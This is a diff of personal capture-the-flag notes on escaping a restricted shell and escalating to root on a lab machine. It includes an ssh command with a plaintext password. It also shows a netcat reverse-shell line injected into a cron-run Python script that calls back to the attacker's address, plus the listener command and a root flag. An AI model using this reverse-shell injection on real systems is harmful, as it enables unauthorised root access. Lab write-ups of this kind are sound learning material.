@@ -114,12 +114,26 @@ user.txt
 
 <h2>Linux priv esc</h2>
 
+
   <h3>Escape  Restricted shell</h3>
     https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells
-    sh mindy@10.10.10.51 -t "bash --noprofile"
+    ssh mindy@10.10.10.51 -t "bash --noprofile"
       pass: P@55W0rd1!2@
 
   <h3>Getting root</h3>
+  cron launches that file (tmp.py)
+  Add (to) tmp.py:
+    os.system('nc -e /bin/bash 10.10.14.105 12345')
+  open an terminal:
+    nc -nlvp 12345
+
+    WAIT!
+
+    Root: b4c9723a28899b1c45db281d99cc87c9
+
+
+<h2> **** NOT USED **** </h2>
+
   /opt$ cat tmp.py
       #!/usr/bin/env python
     import os
